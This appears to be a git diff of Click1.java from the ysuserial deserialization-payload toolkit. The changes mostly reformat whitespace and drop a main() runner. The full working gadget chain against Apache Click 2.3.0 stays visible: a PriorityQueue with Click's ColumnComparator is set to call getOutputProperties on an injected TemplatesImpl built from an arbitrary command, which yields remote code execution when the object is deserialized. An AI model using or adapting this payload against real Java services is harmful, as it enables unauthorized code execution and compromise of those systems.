@@ -5,7 +5,6 @@ import org.apache.click.control.Table;
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 
 import java.math.BigInteger;
@@ -44,38 +43,34 @@ import java.util.PriorityQueue;
 
     by @artsploit
 */
-@SuppressWarnings({ "rawtypes", "unchecked" })
+@SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"org.apache.click:click-nodeps:2.3.0", "javax.servlet:javax.servlet-api:3.1.0"})
-@Authors({ Authors.ARTSPLOIT })
+@Authors({Authors.ARTSPLOIT})
 public class Click1 implements ObjectPayload<Object> {
 
-    public Object getObject(final String command) throws Exception {
+	public Object getObject(final String command) throws Exception {
 
-        // prepare a Column.comparator with mock values
-        final Column column = new Column("lowestSetBit");
-        column.setTable(new Table());
-        Comparator comparator = (Comparator) Reflections.newInstance("org.apache.click.control.Column$ColumnComparator", column);
+		// prepare a Column.comparator with mock values
+		final Column column = new Column("lowestSetBit");
+		column.setTable(new Table());
+		Comparator comparator = (Comparator) Reflections.newInstance("org.apache.click.control.Column$ColumnComparator", column);
 
-        // create queue with numbers and our comparator
-        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
-        // stub data for replacement later
-        queue.add(new BigInteger("1"));
-        queue.add(new BigInteger("1"));
+		// create queue with numbers and our comparator
+		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
+		// stub data for replacement later
+		queue.add(new BigInteger("1"));
+		queue.add(new BigInteger("1"));
 
-        // switch method called by the comparator,
-        // so it will trigger getOutputProperties() when objects in the queue are compared
-        column.setName("outputProperties");
+		// switch method called by the comparator,
+		// so it will trigger getOutputProperties() when objects in the queue are compared
+		column.setName("outputProperties");
 
-        // finally, we inject and new TemplatesImpl object into the queue,
-        // so its getOutputProperties() method will be called
-        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-        final Object templates = Gadgets.createTemplatesImpl(command);
-        queueArray[0] = templates;
+		// finally, we inject and new TemplatesImpl object into the queue,
+		// so its getOutputProperties() method will be called
+		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
+		final Object   templates  = Gadgets.createTemplatesImpl(command);
+		queueArray[0] = templates;
 
-        return queue;
-    }
-
-    public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(Click1.class, args);
-    }
+		return queue;
+	}
 }
